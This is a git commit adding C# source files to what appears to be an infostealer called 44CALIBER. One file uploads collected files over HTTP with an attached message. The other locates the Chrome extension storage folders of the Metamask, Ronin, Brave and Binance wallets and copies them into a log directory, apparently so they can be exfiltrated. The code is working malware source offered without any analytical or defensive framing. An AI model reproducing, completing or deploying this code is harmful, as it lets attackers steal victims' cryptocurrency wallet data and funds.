88313d06ed1e6faafa8223d8bde1c8146d505039
ratabomb <75296588+ratabomb@users.noreply.github.com>
2021-09-17 19:02:22 +0500

    Add files via upload

---
+++ stub/44CALIBER/Resources/sendbyhttp/http.cs
@@ -0,0 +1,19 @@
+﻿using System.Net;
+using System.IO;
+
+namespace youknowcaliber.Resources.sendbyhttp
+{
+    public class http
+    {
+        public static void post(string filepath, string msg)
+        {
+            using (WebClient client = new WebClient())
+            {
+                client.QueryString.Add("message", msg);
+                client.UploadFile("http://localhost:5264", filepath);
+            }
+
+            return;
+        }
+    }
+}
---
+++ stub/44CALIBER/Targets/Браузеры/Targets/Browsers/Chromium/BrowserWallets.cs
@@ -0,0 +1,54 @@
+﻿using System.Collections.Generic;
+using System.IO;
+using System;
+
+namespace youknowcaliber.Targets.Браузеры.Targets.Browsers.Chromium
+{
+    class Wallets
+    {
+        public static void Copy()
+        {
+            string logdir = Help.ExploitDir + "\\Wallets";
+            string extpath = $"{Paths.lappdata}\\Google\\Chrome\\User Data\\Default\\Local Extension Settings";
+
+            List<List<string>> exts = new List<List<string>>();
+            exts.Add(new List<string> { "Metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn" });
+            exts.Add(new List<string> { "RoninWallet", "fnjhmkhhmkbjkkabndcnnogagogbneec" });
+            exts.Add(new List<string> { "BraveWallet", "odbfpeeihdkbihmopkbjmoonfanlbfcl" });
+            exts.Add(new List<string> { "BinanceChain", "fhbohimaelbohpjbbldcngcnapndodjp" });
+
+            if (Directory.Exists(extpath))
+            {
+                if (!Directory.Exists(logdir))
+                {
+                    Directory.CreateDirectory(logdir);
+                }
+                foreach (List<string> ext in exts)
+                {
+                    try
+                    {
+                        string extdir = $"{extpath}\\{ext[1]}";
+                        string logextdir = $"{logdir}\\{ext[0]}";
+                        if (Directory.Exists(extdir))
+                        {
+                            if (!Directory.Exists(logextdir))
+                            {
+                                Directory.CreateDirectory(logextdir);
+                                string[] extfiles = Directory.GetFiles(extdir);
+                                foreach (string extfile in extfiles)
+                                {
+                                    string filename = Path.GetFileName(extfile);
+                                    File.Copy(extfile, $"{logextdir}\\{filename}");
+                                }
+                            }
+                        }
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e);
+                    }
+                }
+            }
+        }
+    }
+}
